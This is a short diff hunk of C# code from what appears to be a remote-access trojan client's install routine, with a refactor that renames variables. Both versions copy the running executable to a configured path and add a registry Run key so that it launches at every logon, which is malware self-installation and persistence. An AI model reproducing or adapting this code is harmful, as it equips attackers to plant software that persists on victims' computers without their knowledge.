@@ -27,14 +27,14 @@ namespace Client.Install
                         }
                     }
 
-                    FileStream Drop;
+                    FileStream fs;
                     if (File.Exists(Settings.ClientFullPath))
-                        Drop = new FileStream(Settings.ClientFullPath, FileMode.Create);
+                        fs = new FileStream(Settings.ClientFullPath, FileMode.Create);
                     else
-                        Drop = new FileStream(Settings.ClientFullPath, FileMode.CreateNew);
-                    byte[] Client = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
-                    Drop.Write(Client, 0, Client.Length);
-                    Drop.Dispose();
+                        fs = new FileStream(Settings.ClientFullPath, FileMode.CreateNew);
+                    byte[] clientExe = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
+                    fs.Write(clientExe, 0, clientExe.Length);
+                    fs.Dispose();
 
                     Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(Settings.ClientFullPath), Settings.ClientFullPath);
                     Methods.CloseMutex();
